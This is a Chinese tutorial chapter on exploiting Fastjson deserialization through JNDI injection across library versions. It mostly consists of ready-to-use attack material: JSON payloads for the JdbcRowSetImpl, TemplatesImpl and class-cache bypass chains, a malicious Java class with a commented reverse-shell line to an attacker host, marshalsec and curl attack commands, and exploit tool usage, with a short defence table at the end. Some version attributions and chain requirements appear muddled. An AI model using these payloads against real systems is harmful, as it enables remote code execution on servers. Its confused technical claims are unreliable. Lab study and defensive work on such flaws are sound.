# Day 40：Fastjson 全版本漏洞深度精讲（JNDI 注入从入门到精通）

> **🎯 高级专题** | 难度：⭐⭐⭐⭐ | 预计学习：150 分钟

---

# 第40章 Fastjson 全版本漏洞 + JNDI注入 从入门到精通 🔥

## 开篇引入：一个JSON解析器引发的"血案" 🩸

哈喽各位小伙伴！欢迎来到第40章——我们正式进入 **Day40~Day45 高级专题大师班**！🎉

前面39天，我们已经把Web安全常见的基础漏洞（SQL注入、XSS、上传、命令注入、中间件、框架漏洞等）都过完了一遍。从今天开始，我们要把一些**实战中最常遇到、危害最大、面试最常考**的漏洞，拿出来单独做**深度专题精讲**。

第一个专题，就是号称 **"Java Web 三大杀器之首"** 的——**Fastjson 反序列化漏洞**！

可能有人会问："Fastjson 不就是个解析JSON的库吗？能有啥漏洞？"

哎，这你就不知道了。Fastjson的漏洞，那可真是：
- 💥 **危害极大**：直接RCE（远程代码执行），拿服务器权限
- 🌍 **影响极广**：全球几百万Java应用都用Fastjson（阿里开源的嘛）
- 🔄 **版本极多**：从1.2.24一直修到1.2.80，修了好几年，越修洞越多 😂
- 🎯 **实战命中率极高**：护网、HW、CTF、真实渗透，TOP3必打漏洞！

这么说吧——如果你去面试渗透测试工程师，面试官100%会问：
> "Fastjson漏洞了解吗？说一下原理和1.2.24、1.2.47、1.2.68的利用区别？"

答不出来？那基本凉了一半 ❄️

今天这一章，我们就从零基础开始：
1. 先搞懂 **什么是Fastjson？什么是@type？**
2. 再用大白话讲清楚 **什么是JNDI注入？**（新手最懵的部分）
3. 然后按时间线，**从1.2.24一路讲到1.2.68+**，每个版本的Payload怎么写、原理是什么、bypass了什么
4. 最后给你 **全套Payload速查表 + 工具使用方法**，实战拿着就能用

准备好了吗？让我们开始这场Fastjson的深度之旅！🚀

---

## 一、Fastjson 是什么？JSON解析的"速度之王" 👑

### 大白话解释 🗣️

在讲漏洞之前，我们先搞清楚最基础的问题：**Fastjson 到底是个啥？**

> **Fastjson 是阿里巴巴开源的一个 Java 库，用来把 JSON 字符串和 Java 对象互相转换（序列化 & 反序列化）。**

啥意思？举个最简单的例子 🍎：

你有一个Java类叫 `User`，长这样：
```java
public class User {
    private String name;  // 姓名
    private int age;      // 年龄
    // ... getter setter
}
```

现在你new一个对象：
```java
User user = new User();
user.setName("王小明");
user.setAge(18);
```

**Fastjson 做的事就是：**

| 操作 | 效果 | 代码 |
|------|------|------|
| **序列化** | Java对象 → JSON字符串 | `JSON.toJSONString(user)` → `{"name":"王小明","age":18}` |
| **反序列化** | JSON字符串 → Java对象 | `JSON.parseObject(json, User.class)` → 还原成User对象 |

很简单对不对？这就是Fastjson最基本的用法——JSON和对象互转。

那它为什么叫"Fast"json？因为它速度极快，比Jackson、Gson这些同类库快很多，所以国内Java项目几乎全用它！（阿里出品，性能杠杠的～）

---

### Fastjson 漏洞的"万恶之源"：`@type` 字段 🔑

现在重点来了！Fastjson 有一个**非常强大（也非常危险）**的功能——**在JSON字符串里指定要反序列化的类名！**

怎么指定呢？用一个特殊的字段叫 **`@type`**！

举个例子：
```json
{
  "@type": "com.example.User",
  "name": "王小明",
  "age": 18
}
```

当Fastjson解析这个JSON的时候，看到 `@type`，就会：
1. 去加载 `com.example.User` 这个类 ✅
2. 把后面的 `name` 和 `age` 设置进去 ✅
3. 返回一个 `User` 对象给你 ✅

听起来没问题？但是！**如果 @type 指定的不是普通的 User 类，而是一个"危险的类"呢？** 😈

什么是危险的类？就是：
- 类的某个 setter 方法里会执行代码
- 或者类的 getter 被调用时会触发危险操作
- 或者类在构造时（newInstance）就会执行代码

Fastjson的漏洞，**100%都是围绕 @type 做文章**——通过各种手段，让 @type 指向一个能RCE的危险类，从而执行任意代码！

---

## 二、什么是 JNDI 注入？小白也能看懂的图解 🧠

### 先别懵，用生活例子讲明白 JNDI 🏪

新手一听到 "JNDI注入" 四个字，头都大了："这啥啊？JNDI？听都听不懂……"

别急！我用一个**网购取快递**的生活例子，30秒让你搞明白！

#### 什么是 JNDI？🤔

JNDI（Java Naming and Directory Interface）直译是"Java命名和目录接口"。说白了，它就是Java里的**"快递驿站"**：

| 快递驿站（生活） | JNDI（Java） |
|----------------|-------------|
| 📦 你有一堆快递，存放在驿站的格子里 | 🗄️ 程序有一堆资源（数据源、对象、配置），存在JNDI里 |
| 🏷️ 每个格子有个编号（比如 A-12、B-07） | 🔑 每个资源有个"名字"（Lookup Key） |
| 📮 你要取快递 → 告诉驿站："给我 A-12 的快递" | 🔍 程序要用资源 → 调用 `lookup("名字")` 取出来 |

代码里长这样：
```java
// 程序说："我要拿 jdbc/mydb 这个资源"
Context ctx = new InitialContext();
DataSource ds = (DataSource) ctx.lookup("jdbc/mydb");
// JNDI就把对应的数据库连接池对象返回给你
```

正常情况下，`lookup()` 的参数是写死在程序里的，比如 `"jdbc/mydb"`——这就像你取自己的快递，报的是自己的取件号，没问题。

---

### 那什么是 JNDI 注入？💉

**JNDI 注入 = 攻击者控制了 lookup() 的参数，让程序去"取一个恶意的快递"！** 😈

继续用快递驿站举例 🚨：

> 正常情况：你让驿站取 A-12 → 拿到你自己的快递 ✅
>
> **JNDI注入情况**：黑客入侵了系统，把取件号改成了 **"ldap://黑客的服务器:1389/Evil"**
>
> 驿站（JNDI）一看："哦，这不是我们本地的编号啊，是个远程地址！"
>
> 于是驿站**真的跑到黑客的服务器上**，把黑客准备好的"恶意包裹"取了回来！
>
> 取回来的包裹里装的是——**一段黑客写的Java代码**，程序一拆包（加载对象），代码就执行了！💥

这就是JNDI注入的全过程！
**一句话总结：让 lookup() 加载远程恶意对象，从而执行任意代码！**

---

### JNDI注入的三大协议（取快递的三种方式）📡

JNDI支持多种"取快递"的方式，实战中最常用的有三种：

| 协议 | 前缀 | 特点 | 实战推荐度 |
|------|------|------|-----------|
| **LDAP** | `ldap://` | 最常用、兼容性最好、JDK版本限制少 | ⭐⭐⭐⭐⭐（首选！） |
| **RMI** | `rmi://` | 老牌协议，JDK 8u121后有限制 | ⭐⭐⭐ |
| **DNS** | `dns://` | 只能打DNSLog出网检测，不能直接RCE | ⭐⭐（漏洞验证用） |

**新手记住：实战99%都用 LDAP！**

---

### JNDI 注入攻击完整流程图（小白必看！）🚰

<svg width="800" height="420" xmlns="http://www.w3.org/2000/svg">
  <defs>
    <linearGradient id="jndibg" x1="0" y1="0" x2="1" y2="1">
      <stop offset="0%" stop-color="#fef2f2"/>
      <stop offset="100%" stop-color="#ecfeff"/>
    </linearGradient>
    <marker id="arr" markerWidth="10" markerHeight="8" refX="9" refY="4" orient="auto">
      <polygon points="0 0, 10 4, 0 8" fill="#dc2626"/>
    </marker>
    <marker id="arr2" markerWidth="10" markerHeight="8" refX="9" refY="4" orient="auto">
      <polygon points="0 0, 10 4, 0 8" fill="#0284c7"/>
    </marker>
  </defs>
  <rect x="0" y="0" width="800" height="420" rx="16" fill="url(#jndibg)"/>
  <text x="400" y="32" text-anchor="middle" fill="#7f1d1d" font-weight="bold" font-size="20">🧠 JNDI 注入攻击完整流程图（快递驿站版）</text>
  <!-- 左：受害者 -->
  <g transform="translate(40,70)">
    <rect x="0" y="0" width="170" height="90" rx="14" fill="#fee2e2" stroke="#dc2626" stroke-width="3"/>
    <text x="85" y="30" text-anchor="middle" fill="#991b1b" font-weight="bold" font-size="16">🎯 目标Java服务器</text>
    <text x="85" y="55" text-anchor="middle" fill="#000" font-size="13">接收前端传来的JSON</text>
    <text x="85" y="78" text-anchor="middle" fill="#000" font-size="13">Fastjson 调用 parseObject()</text>
  </g>
  <!-- 中：@type参数 -->
  <g transform="translate(250,85)">
    <rect x="0" y="0" width="200" height="60" rx="12" fill="#fef3c7" stroke="#d97706" stroke-width="2"/>
    <text x="100" y="25" text-anchor="middle" fill="#92400e" font-weight="bold" font-size="15">① 注入 @type 参数</text>
    <text x="100" y="48" text-anchor="middle" font-family="Consolas" font-size="11" fill="#78350f">@type: com.sun.rowset.JdbcRowSetImpl</text>
  </g>
  <line x1="210" y1="115" x2="250" y2="115" stroke="#dc2626" stroke-width="2.5" marker-end="url(#arr)"/>
  <!-- 中：setter 触发 -->
  <g transform="translate(250,170)">
    <rect x="0" y="0" width="200" height="70" rx="12" fill="#fef3c7" stroke="#d97706" stroke-width="2"/>
    <text x="100" y="26" text-anchor="middle" fill="#92400e" font-weight="bold" font-size="14">② JdbcRowSetImpl#setDataSourceName</text>
    <text x="100" y="48" text-anchor="middle" fill="#78350f" font-size="12">参数 = ldap://黑客VPS:1389/Evil</text>
    <text x="100" y="66" text-anchor="middle" fill="#78350f" font-size="11">→ 内部调用了 JNDI lookup() !</text>
  </g>
  <line x1="350" y1="145" x2="350" y2="170" stroke="#dc2626" stroke-width="2.5" marker-end="url(#arr)"/>
  <!-- 右：攻击者VPS -->
  <g transform="translate(590,70)">
    <rect x="0" y="0" width="170" height="90" rx="14" fill="#dcfce7" stroke="#16a34a" stroke-width="3"/>
    <text x="85" y="30" text-anchor="middle" fill="#14532d" font-weight="bold" font-size="16">😈 黑客VPS（恶意服务器）</text>
    <text x="85" y="55" text-anchor="middle" fill="#000" font-size="13">LDAP服务监听 1389端口</text>
    <text x="85" y="78" text-anchor="middle" fill="#000" font-size="13">HTTP服务存放恶意类 Evil.class</text>
  </g>
  <!-- 步骤3 连接 -->
  <line x1="450" y1="205" x2="590" y2="120" stroke="#0284c7" stroke-width="2.5" marker-end="url(#arr2)"/>
  <text x="500" y="175" text-anchor="middle" fill="#075985" font-weight="bold" font-size="12">③ 目标服务器主动连接黑客！</text>
  <!-- 步骤4 返回恶意引用 -->
  <line x1="590" y1="155" x2="450" y2="235" stroke="#0284c7" stroke-width="2.5" marker-end="url(#arr2)" stroke-dasharray="6,3"/>
  <text x="500" y="255" text-anchor="middle" fill="#075985" font-weight="bold" font-size="12">④ LDAP返回恶意Reference（远程类地址）</text>
  <!-- 步骤5 加载恶意类 -->
  <g transform="translate(40,290)">
    <rect x="0" y="0" width="220" height="90" rx="14" fill="#fef08a" stroke="#ca8a04" stroke-width="3"/>
    <text x="110" y="28" text-anchor="middle" fill="#854d0e" font-weight="bold" font-size="15">⑤ 目标加载远程 Evil.class</text>
    <text x="110" y="55" text-anchor="middle" fill="#000" font-size="12">去黑客VPS下载 Evil.class</text>
    <text x="110" y="78" text-anchor="middle" fill="#991b1b" font-size="13" font-weight="bold">⑥ 静态代码块直接执行！→ RCE 💥</text>
  </g>
  <!-- 小提示 -->
  <g transform="translate(300,310)">
    <rect x="0" y="0" width="460" height="70" rx="12" fill="#fff1f2" stroke="#e11d48" stroke-width="2"/>
    <text x="230" y="26" text-anchor="middle" fill="#9f1239" font-weight="bold" font-size="14">💡 关键点：目标服务器会主动"出网"！</text>
    <text x="20" y="50" fill="#000" font-size="12">• 前提1：目标服务器能访问黑客VPS（出网）</text>
    <text x="20" y="68" fill="#000" font-size="12">• 前提2：信任远程URL类加载（JDK 8u191 后有限制，需要bypass）</text>
  </g>
</svg>

---

### 恶意类 Evil.class 长啥样？（最核心的部分！）💀

说了这么多，黑客放在VPS上的那个 `Evil.class` 到底是什么？

它就是一个**普通的Java类**，但是在 **静态代码块 `static{}`** 里写了执行命令的代码：

```java
// Evil.java（黑客写的恶意类）
import java.lang.Runtime;

public class Evil {
    // 🌟 static{} 静态代码块！
    // 🌟 这个类一被加载，里面的代码就立刻自动执行！
    static {
        try {
            Runtime.getRuntime().exec("calc.exe");   // Windows弹计算器
            // Runtime.getRuntime().exec("bash -c $@|sh . echo bash -i >& /dev/tcp/VPS/7777 0>&1"); // 反弹Shell
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    // 构造方法也可以，加载类时会newInstance
    public Evil() {
        // 这里的代码也会执行
    }
}
```

**原理就是这么朴实无华！** 整个JNDI注入的过程，就是想方设法让目标服务器加载你写的这个Evil类而已。

编译命令：
```bash
javac Evil.java
# 生成 Evil.class，放到黑客VPS的HTTP服务目录下（比如 python3 -m http.server 8888）
```

---

## 三、Fastjson 漏洞时间线（从1.2.24到1.2.80）📅

Fastjson漏洞的历史，就是一场 **"开发者修补丁 ↔ 安全研究员找bypass"** 的持久战，打了整整4年！

我们按时间顺序一个一个来讲：

| 时间 | 版本 | 漏洞代表 | 关键突破 |
|-----|------|---------|---------|
| 2017年 | **1.2.24** | 第一个RCE漏洞 | @type 任意类加载 → TemplateImpl 链 / JNDI 链 |
| 2017年中 | 1.2.25~1.2.41 | 开启safeMode+黑名单 | 各种黑名单bypass |
| 2018年 | **1.2.47** | 重大bypass漏洞 | 利用 `java.lang.AutoCloseable` + 缓存绕过黑名单！ |
| 2019年 | 1.2.48~1.2.67 | 增强黑名单+autotype关闭 | 新bypass层出不求（LDC2_TEST、BadAttribute等） |
| 2020年 | **1.2.68** | 新的利用链 | `AutoType` 关闭状态下的绕过（非JNDI本地链） |
| 2022年 | 1.2.80+ | 基本修完 | 但还有历史版本永远存在漏洞 💀 |

---

## 四、1.2.24 第一个RCE漏洞（最经典！必掌握）⭐⭐⭐⭐⭐

### 利用条件 ✅
- Fastjson 版本 **≤ 1.2.24**
- JDK 版本不限（只要能出网就行）
- autotype 默认就是开启的（1.2.25之前默认开）

1.2.24有两条利用链，我们分别讲。

---

### 链一：JdbcRowSetImpl JNDI 注入链（实战首选！🎯）

**原理一句话**：Fastjson反序列化 `com.sun.rowset.JdbcRowSetImpl` 这个类 → 自动调用 `setDataSourceName()` 方法 → 参数我们可控 → 传入恶意LDAP地址 → JNDI lookup触发！

完整Payload：
```json
{
  "@type": "com.sun.rowset.JdbcRowSetImpl",
  "dataSourceName": "ldap://你的VPS:1389/Evil",
  "autoCommit": true
}
```

**为什么 `autoCommit` 要设为 true？**

因为 Fastjson 在反序列化这个类的时候，会先设置 `dataSourceName`（存下来），然后设置 `autoCommit` 的时候，**JdbcRowSetImpl 的内部逻辑会去连接数据库**，连接前调用 `lookup(dataSourceName)` 找数据源！💥

就是这么巧妙！`autoCommit=true` 就是触发 lookup 的"开关"！

---

#### Vulhub 环境复现步骤（手把手）🛠️

**第一步：启动Vulhub靶场**
```bash
cd /root/vulhub/fastjson/1.2.24-rce
docker-compose up -d
# 启动后访问 http://你的IP:8090
```

**第二步：在黑客VPS上启动恶意服务（LDAP+HTTP）** 🧟‍♂️

推荐用 **marshalsec** 这个神器（一键起LDAP/RMI服务）：
```bash
# 1. 先编译恶意类
echo 'public class Evil {
    static {
        try { Runtime.getRuntime().exec("touch /tmp/pwned"); }
        catch (Exception e) {}
    }
}' > Evil.java
javac Evil.java
# 当前目录生成 Evil.class

# 2. 启动HTTP服务，让目标能下载Evil.class
python3 -m http.server 8888 &

# 3. 启动LDAP服务，指向刚才的HTTP服务
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer \
    "http://你的VPS:8888/#Evil" 1389
```

marshalsec启动成功会显示：
```
* Listening on 0.0.0.0:1389
* Connection received from 目标IP:xxxx
...
```

**第三步：发送 Payload 给目标** 🚀

用Burp Suite抓包，或者直接curl：
```bash
curl -X POST http://目标IP:8090/ \
    -H "Content-Type: application/json" \
    -d '{
        "@type": "com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName": "ldap://你的VPS:1389/Evil",
        "autoCommit": true
    }'
```

**第四步：验证RCE成功！** ✅
```bash
# 进入靶机容器
docker exec -it 靶机容器名 ls -la /tmp
# 看到 pwned 文件 → 成功！🎉
```

---

#### JNDI注入链原理图（1.2.24版本）

<svg width="800" height="340" xmlns="http://www.w3.org/2000/svg">
  <defs>
    <linearGradient id="bg224" x1="0" y1="0" x2="1" y2="0">
      <stop offset="0%" stop-color="#fff7ed"/>
      <stop offset="100%" stop-color="#fef3c7"/>
    </linearGradient>
  </defs>
  <rect x="0" y="0" width="800" height="340" rx="16" fill="url(#bg224)"/>
  <text x="400" y="32" text-anchor="middle" fill="#92400e" font-weight="bold" font-size="20">⭐ Fastjson 1.2.24 JNDI 链：JdbcRowSetImpl 触发流程</text>
  <!-- JSON输入 -->
  <g transform="translate(30,70)"><rect x="0" y="0" width="160" height="70" rx="12" fill="#fff" stroke="#b45309" stroke-width="2"/>
    <text x="80" y="28" text-anchor="middle" fill="#78350f" font-weight="bold" font-size="14">① 恶意JSON请求</text>
    <text x="80" y="52" text-anchor="middle" font-family="Consolas" font-size="10" fill="#000">@type: JdbcRowSetImpl</text>
    <text x="80" y="66" text-anchor="middle" font-family="Consolas" font-size="10" fill="#000">dataSourceName: ldap://...</text>
  </g>
  <defs><marker id="ar" markerWidth="10" markerHeight="8" refX="9" refY="4" orient="auto"><polygon points="0 0,10 4,0 8" fill="#b45309"/></marker></defs>
  <line x1="190" y1="105" x2="230" y2="105" stroke="#b45309" stroke-width="2.5" marker-end="url(#ar)"/>
  <!-- Fastjson 解析 -->
  <g transform="translate(230,70)"><rect x="0" y="0" width="160" height="70" rx="12" fill="#fff" stroke="#b45309" stroke-width="2"/>
    <text x="80" y="28" text-anchor="middle" fill="#78350f" font-weight="bold" font-size="14">② parseObject()</text>
    <text x="80" y="50" text-anchor="middle" fill="#000" font-size="11">解析 @type → 加载类</text>
    <text x="80" y="68" text-anchor="middle" fill="#000" font-size="11">调用所有 setter 方法</text>
  </g>
  <line x1="390" y1="105" x2="430" y2="105" stroke="#b45309" stroke-width="2.5" marker-end="url(#ar)"/>
  <!-- setDataSourceName -->
  <g transform="translate(430,55)"><rect x="0" y="0" width="170" height="45" rx="10" fill="#fde68a" stroke="#b45309" stroke-width="2"/>
    <text x="85" y="20" text-anchor="middle" fill="#78350f" font-weight="bold" font-size="13">③ setDataSourceName(ldap地址)</text>
    <text x="85" y="39" text-anchor="middle" fill="#57534e" font-size="11">→ 成员变量被赋值</text>
  </g>
  <line x1="515" y1="105" x2="515" y2="120" stroke="#b45309" stroke-width="2.5" marker-end="url(#ar)"/>
  <!-- setAutoCommit 触发 -->
  <g transform="translate(430,120)"><rect x="0" y="0" width="170" height="50" rx="10" fill="#fca5a5" stroke="#dc2626" stroke-width="3"/>
    <text x="85" y="20" text-anchor="middle" fill="#7f1d1d" font-weight="bold" font-size="14">⭐④ setAutoCommit(true)</text>
    <text x="85" y="42" text-anchor="middle" fill="#000" font-size="11">→ 内部调用 lookup()！🔥</text>
  </g>
  <!-- JNDI -->
  <line x1="600" y1="145" x2="640" y2="180" stroke="#dc2626" stroke-width="2.5" marker-end="url(#ar)"/>
  <g transform="translate(600,180)"><rect x="0" y="0" width="170" height="55" rx="12" fill="#fee2e2" stroke="#dc2626" stroke-width="2"/>
    <text x="85" y="24" text-anchor="middle" fill="#991b1b" font-weight="bold" font-size="14">⑤ JNDI LDAP 请求</text>
    <text x="85" y="48" text-anchor="middle" fill="#000" font-size="11">目标 → 黑客VPS:1389</text>
  </g>
  <!-- 最后 -->
  <g transform="translate(30,255)"><rect x="0" y="0" width="330" height="65" rx="12" fill="#fee2e2" stroke="#dc2626" stroke-width="3"/>
    <text x="165" y="28" text-anchor="middle" fill="#991b1b" font-weight="bold" font-size="16">⑥ 下载 Evil.class → 静态代码执行！→ RCE 💥</text>
    <text x="165" y="54" text-anchor="middle" fill="#000" font-size="12">Runtime.getRuntime().exec(命令);</text>
  </g>
  <g transform="translate(400,250)"><rect x="0" y="0" width="370" height="75" rx="12" fill="#eff6ff" stroke="#2563eb" stroke-width="2"/>
    <text x="185" y="26" text-anchor="middle" fill="#1e40af" font-weight="bold" font-size="14">💡 新手 Payload 三件套（必背）</text>
    <text x="15" y="50" fill="#000" font-size="12">① Content-Type: application/json （不写可能不解析JSON）</text>
    <text x="15" y="70" fill="#000" font-size="12">② @type 写完整包名  ③ autoCommit 必须写 true！</text>
  </g>
</svg>

---

### 链二：TemplatesImpl 本地链（不需要出网！但有限制）🛡️

JNDI链有个大前提：**目标必须能出网访问黑客的VPS**。如果目标在内网，连不上外网怎么办？

这时候就轮到 **TemplatesImpl 链** 登场了！它是**本地利用链，不需要目标出网！**

**原理**：Fastjson反序列化 `com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl` 这个类 → 把我们准备好的 **恶意字节码byte[]** 注入进去 → Fastjson内部调用 `getOutputProperties()` → 触发 `newTransformer()` → 加载我们的恶意字节码执行！

完整Payload（重点是 _bytecodes 字段，放编译好的恶意类字节码）：
```json
{
  "@type": "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
  "_bytecodes": ["yv66vgAAAD...（一长串Base64编码的恶意类字节码）..."],
  "_name": "Pwn",
  "_tfactory": {},
  "_outputProperties": {}
}
```

**_bytecodes 是什么？**
就是把我们写的 `Evil.java` 编译成 `Evil.class`，然后把class文件的二进制内容做 **Base64编码**，塞进 `_bytecodes` 数组里！

#### 怎么生成 _bytecodes？🔨

Kali一行命令搞定：
```bash
# 1. 写Evil.java (注意：必须继承 AbstractTranslet！)
cat > Evil.java << 'EOF'
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import java.io.IOException;

public class Evil extends AbstractTranslet {
    static {
        try {
            Runtime.getRuntime().exec("touch /tmp/pwned");
        } catch (IOException e) {}
    }
    public void transform(DOM doc, SerializationHandler[] handlers) throws TransletException {}
    public void transform(DOM doc, DTMAxisIterator iter, SerializationHandler handler) throws TransletException {}
}
EOF

# 2. 编译
javac -cp $JAVA_HOME/lib/tools.jar Evil.java

# 3. Base64编码，注意换行都去掉
cat Evil.class | base64 -w 0
# 输出一长串就是 _bytecodes 的值！复制粘贴就行
```

#### TemplatesImpl 链的优缺点 ⚖️

| 优点 ✅ | 缺点 ❌ |
|-------|-------|
| **不需要目标出网**！内网环境也能打 | 1. 必须能继承 `AbstractTranslet`（有些JDK阉割了） |
| 不依赖LDAP/RMI服务，部署简单 | 2. **必须开启 Feature.SupportNonPublicField** |
| 字节码直接注入，没有网络限制 | 3. 1.2.25 之后黑名单 ban 了这个类 |

所以实战中：**能出网用JNDI链，不能出网再试TemplatesImpl链！**

---

## 五、1.2.47 重大Bypass漏洞（第二个经典！必掌握）⭐⭐⭐⭐⭐

### 背景：1.2.25之后官方修了啥？🔒

1.2.24漏洞爆发后，官方紧急发布1.2.25，做了两个大改动：
1. **默认关闭 AutoType**（@type 默认不解析了，要手动开）
2. **加了黑名单 denyList**：把 `JdbcRowSetImpl`、`TemplatesImpl` 这些危险类全加进了黑名单，@type敢写直接报错！

安全研究者们bypass了好多次（改包名变体、写子类等等），一路bypass到1.2.46，直到——**1.2.47这个史诗级bypass横空出世！** 🚀

### 1.2.47 Bypass 核心原理（大白话版）🧠

这个bypass非常巧妙，用了三个"阳谋"组合拳：

| 步骤 | 手段 | 目的 |
|-----|------|------|
| ① | @type 写 `java.lang.AutoCloseable`（接口） | 绕过黑名单！因为这是Java标准库接口，官方不可能ban |
| ② | JSON里嵌套 `{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"}` | 通过Class.forName()把危险类**放进Fastjson的内部缓存mapping里** |
| ③ | 再正常写 `{"@type":"com.sun.rowset.JdbcRowSetImpl", ...}` | 因为缓存里有了，Fastjson就认为是合法的，**跳过黑名单检查**！ |

简单讲：**先让官方认可的"好人"（Class类）把坏人偷偷带进城（进缓存），然后坏人就可以大摇大摆地进来作案了！** 😈

---

### 1.2.47 完整 Payload（复制即用！）📋

```json
{
  "a": {
    "@type": "java.lang.AutoCloseable",
    "@type": "org.apache.ibatis.datasource.pooled.PooledDataSource",
    "driver": "org.gjt.mm.mysql.Driver",
    "url": "jdbc:mysql://你的VPS:3306/test?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=yso_CommonsCollections5_calc",
    "username": "root",
    "password": "123456"
  }
}
```

或者更通用的 **JNDI + 缓存绕过版**：
```json
{
  "a": {
    "@type": "java.lang.Class",
    "val": "com.sun.rowset.JdbcRowSetImpl"
  },
  "b": {
    "@type": "com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName": "ldap://你的VPS:1389/Evil",
    "autoCommit": true
  }
}
```

**原理拆解**：
1. 先反序列化 `"a"` → @type是`java.lang.Class`（白名单），val是我们的目标类 → 成功将 `JdbcRowSetImpl` 加载并**加入缓存**
2. 再反序列化 `"b"` → Fastjson一看："JdbcRowSetImpl？哦，刚才加载过了，在缓存里呢！" → **直接跳过黑名单检查**，成功反序列化 → JNDI触发 → RCE！

**就是这么妙！** 1.2.47 这个漏洞利用方式后来被无数漏洞借鉴，成为了"缓存绕过类"漏洞的祖师爷～

---

## 六、1.2.68 以后的利用（AutoType关闭下的新战场）⚔️

1.2.49之后，官方把上面的缓存问题也修了，还加固了黑名单。但是研究者又找到了**不需要开启AutoType也能打**的新链子：

### 常见的 1.2.68+ 利用链

| 链名 | 触发类 | 原理简述 | 需要开启AutoType? |
|-----|-------|---------|-----------------|
| **JNDI 注入链**（推荐） | 同上，各种bypass变体 | 继续找黑名单没覆盖到的触发lookup的类 | ❌ 新版本需要 |
| **CommonsBeanutils** CB链 | `java.lang.PriorityQueue` + CB的 `BeanComparator` | 本地反序列化链（和 ysoserial CB链原理同） | ✅ **不需要！** |
| **C3P0 链** | `com.mchange.v2.c3p0.JndiRefForwardingDataSource` | 连接池里的JNDI参数可控 | 看情况 |

最新的Fastjson利用，建议直接用 **JNDI-Injection-Exploit** 或者 **FastjsonScan** 这种全自动工具，一键列出所有可用Payload！

---

## 七、Fastjson 实战工具全套（新手直接用）🛠️

### 工具一：FastjsonScan 综合扫描器 ✨

一个Python脚本搞定 **"检测版本 → 枚举可利用链 → 一键RCE"** 全流程！

```bash
# 下载
git clone https://github.com/tangxiaofeng7/FastjsonScan.git
cd FastjsonScan
pip3 install -r requirements.txt

# 使用（检测+验证+攻击一条龙）
python3 fastjsonScan.py -u "http://目标IP:8090/" --dnslog "你的DNSLog地址"
# 或者直接弹命令
python3 fastjsonScan.py -u "http://目标IP:8090/" -e "touch /tmp/pwned" --ldap ldap://你的VPS:1389
```

### 工具二：JNDI-Injection-Exploit（LDAP/RMI服务一键起）🎯

这个工具自动给你：起LDAP/RMI服务 + 生成对应Base64字节码 + 输出所有链的Payload！

```bash
# GitHub搜索下载，是个jar包
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar \
    -C "touch /tmp/pwned" \
    -A "你的VPS公网IP"

# 运行后工具会打印 6~8 种不同版本的Fastjson Payload！
# 全部复制下来，挨个发给目标就行！
```

输出示例：
```
[*] Payload for Fastjson 1.2.24:
  {"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://...","autoCommit":true}

[*] Payload for Fastjson 1.2.47:
  {"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{...}}
...
```

### 工具三：DNSLog 出网检测（先确认能不能打！）🔍

在尝试RCE之前，**先测目标能不能出网！** 省得白忙活：

```json
{
  "@type": "java.net.Inet4Address",
  "val": "xxxxxx.dnslog.cn"
}
```

或者用LDAP DNSLog：
```json
{
  "@type": "com.sun.rowset.JdbcRowSetImpl",
  "dataSourceName": "ldap://xxxxxx.dnslog.cn:1389/a",
  "autoCommit": true
}
```

发送之后，去DNSLog后台看有没有DNS请求记录：
- **有记录** → 目标能出网 → 直接上JNDI链 💥
- **没记录** → 目标不出网 → 换TemplatesImpl本地链，或放弃

---

## 八、Fastjson 全版本 Payload 速查表 📖

面试/实战前，把这张表背下来！⏰

| Fastjson 版本 | 首选Payload（按成功率排序） | 需要开AutoType? |
|--------------|---------------------------|----------------|
| **≤1.2.24** | ① `JdbcRowSetImpl` JNDI ② `TemplatesImpl` 本地链 | ✅（默认就开着） |
| **1.2.25 ~ 1.2.40** | ① 各种黑名单bypass类名变体（工具自动生成）② `LdapContext` 等 | ✅（手动开了才有可能） |
| **1.2.41 ~ 1.2.47** | ① 先用 `java.lang.Class` 缓存bypass再打JdbcRowSetImpl | ✅（但ban的类能绕过） |
| **1.2.48 ~ 1.2.66** | ① 新版本类：`BadAttributeValueExpException` 等 + AutoType ② MySQL JDBC反序列化 | ✅ |
| **1.2.67 ~ 1.2.80** | ① CommonsBeanutils本地链（无需AutoType）② JNDI各种新类 | 看链 |
| **≥ 1.2.83** | 官方基本修完，但历史版本漏洞永远存在 | —— |

---

## 九、防御方案（蓝队/开发必看）🛡️

最后讲一下怎么防御Fastjson漏洞，毕竟安全是攻防两端的事：

| 防御手段 | 效果 | 推荐度 |
|---------|------|-------|
| **① 升级到最新稳定版（≥1.2.83）** | 修复大部分已知漏洞 | ⭐⭐⭐⭐⭐ 必须做 |
| **② 彻底关闭AutoType（ParserConfig.getGlobalInstance().setAutoTypeSupport(false)）** | 99%的@type链直接作废！ | ⭐⭐⭐⭐⭐ 强烈建议 |
| **③ 升级JDK到高版本（≥8u191 / 11+）** | 默认禁止远程URL类加载，JNDI链直接废掉大半 | ⭐⭐⭐⭐ |
| **④ 升级第三方依赖（CommonsBeanutils等）** | 杜绝本地反序列化链的gadget | ⭐⭐⭐⭐ |
| **⑤ WAF过滤 @type 关键字** | 挡住script kiddies（但绕过方法很多） | ⭐⭐⭐ |
| **⑥ 服务器禁止不必要的出网** | JNDI链没地方连，直接作废 | ⭐⭐⭐⭐⭐ 架构层防护 |

---

## 本章总结 📝

Fastjson漏洞是Java Web安全的"第一课"，我们今天从零基础一路讲到1.2.80：

### 核心知识点回顾 ✅

1. **Fastjson是什么？** 阿里的JSON解析库，@type 字段指定反序列化的类 → 漏洞根源
2. **JNDI注入是什么？** 让 lookup("ldap://黑客地址/Evil") 加载远程恶意类 → static{} 代码执行
